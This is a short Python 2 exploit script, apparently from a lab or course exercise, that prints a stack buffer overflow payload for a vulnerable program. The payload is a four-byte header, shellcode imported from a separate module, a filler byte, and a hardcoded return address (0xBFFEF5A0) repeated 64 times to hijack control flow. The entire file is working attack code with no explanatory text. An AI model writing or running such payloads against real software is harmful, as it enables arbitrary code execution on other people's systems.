#!/usr/bin/python

from shellcode import shellcode
from struct import pack

if __name__ == '__main__':
    print "\x08\x00\x00\x40" + shellcode + "\x80" + pack("<I", 0xBFFEF5A0)*64
